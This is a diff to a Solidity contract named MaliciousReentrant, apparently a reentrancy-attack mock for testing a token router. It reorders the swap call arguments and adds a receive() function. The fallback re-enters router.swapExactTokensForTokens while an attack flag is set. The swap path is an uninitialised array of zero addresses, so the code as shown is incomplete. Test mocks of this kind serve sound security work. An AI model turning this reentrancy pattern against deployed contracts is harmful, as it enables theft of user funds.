@@ -15,12 +15,11 @@ contract MaliciousReentrant {
         require(!attackInitiated, "Attack already initiated");
         attackInitiated = true;
         router.swapExactTokensForTokens(
-            address(this),
-            address(0),
-            100 ether,
-            90 ether,
-            address(this),
-            block.timestamp + 1200
+            100 ether,                        // amountIn
+            90 ether,                         // amountOutMin
+            new address[](2),                  // path
+            address(this),                    // to
+            block.timestamp + 1200             // deadline
         );
     }
 
@@ -28,13 +27,15 @@ contract MaliciousReentrant {
     fallback() external payable {
         if (attackInitiated) {
             router.swapExactTokensForTokens(
-                address(this),
-                address(0),
-                100 ether,
-                90 ether,
-                address(this),
-                block.timestamp + 1200
+                100 ether,                        // amountIn
+                90 ether,                         // amountOutMin
+                new address[](2),                  // path
+                address(this),                    // to
+                block.timestamp + 1200             // deadline
             );
         }
     }
+
+    // Add receive function to handle plain ether transfers
+    receive() external payable {}
 }
